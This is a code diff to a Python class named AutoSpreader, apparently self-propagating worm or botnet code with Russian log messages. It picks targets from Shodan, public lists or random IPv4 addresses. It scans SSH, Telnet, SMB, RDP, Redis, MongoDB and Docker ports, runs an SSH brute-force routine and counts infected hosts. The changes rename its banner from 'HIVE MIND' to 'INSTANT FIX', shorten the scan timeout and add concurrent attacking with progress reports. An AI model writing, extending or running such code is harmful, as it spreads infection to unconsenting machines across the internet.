@@ -54,7 +54,7 @@ class AutoSpreader:
         self.stats = {'scanned':0, 'infected':0, 'open_ports':0}
         self.thread = threading.Thread(target=self._worker, daemon=True)
         self.thread.start()
-        self.message_queue.put("[System] HIVE MIND запущен")
+        self.message_queue.put("[System] INSTANT FIX запущен")
 
     def stop(self):
         self.running = False
@@ -63,7 +63,7 @@ class AutoSpreader:
 
     async def attack_target(self, ip):
         ports = await ssh_bruteforce.__globals__['quick_port_scan'](
-            ip, [22,23,445,3389,8291,6379,27017,2375,2323,2222], timeout=0.4
+            ip, [22,23,445,3389,8291,6379,27017,2375,2323,2222], timeout=0.3
         )
         if not ports:
             return False
@@ -106,7 +106,6 @@ class AutoSpreader:
         asyncio.set_event_loop(loop)
         while self.running:
             target_ips = []
-            # Сбор через Shodan
             if self.shodan_api:
                 try:
                     results = self.shodan_api.search("port:22,23,8291,80", limit=200)
@@ -116,14 +115,12 @@ class AutoSpreader:
                             target_ips.append(ip)
                             self.scanned_ips.add(ip)
                 except: pass
-            # Публичные цели
             if not target_ips:
                 public = loop.run_until_complete(fetch_targets())
                 for ip in public:
                     if ip not in self.scanned_ips:
                         target_ips.append(ip)
                         self.scanned_ips.add(ip)
-            # Случайные, если совсем ничего
             if not target_ips:
                 for _ in range(200):
                     ip = str(ipaddress.IPv4Address(random.randint(0x01000000, 0xDFFFFFFF)))
@@ -133,7 +130,17 @@ class AutoSpreader:
             self.stats['scanned'] += len(target_ips)
             self.message_queue.put(f"[Scan] {len(target_ips)} целей")
             sem = asyncio.Semaphore(self.worker_threads)
-            tasks = [self.attack_target(ip) for ip in target_ips]
+            completed = 0
+            total = len(target_ips)
+            async def attack(ip):
+                nonlocal completed
+                async with sem:
+                    await self.attack_target(ip)
+                    completed += 1
+                    if completed % max(1, total//10) == 0:
+                        pct = int(completed/total*100)
+                        self.message_queue.put(f"[Progress] ({pct}%)")
+            tasks = [attack(ip) for ip in target_ips]
             loop.run_until_complete(asyncio.gather(*tasks))
             self.message_queue.put(f"[Stats] Проверено: {self.stats['scanned']} | Заражено: {self.stats['infected']}")
             time.sleep(self.interval)
@@ -148,6 +155,16 @@ class AutoSpreader:
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
         sem = asyncio.Semaphore(min(self.worker_threads, len(target_list)))
-        tasks = [self.attack_target(ip) for ip in target_list]
+        completed = 0
+        total = len(target_list)
+        async def attack(ip):
+            nonlocal completed
+            async with sem:
+                await self.attack_target(ip)
+                completed += 1
+                if completed % max(1, total//10) == 0:
+                    pct = int(completed/total*100)
+                    self.message_queue.put(f"[Progress] ({pct}%)")
+        tasks = [attack(ip) for ip in target_list]
         loop.run_until_complete(asyncio.gather(*tasks))
         self.message_queue.put(f"[Завершено] Обработано {len(target_list)} целей")
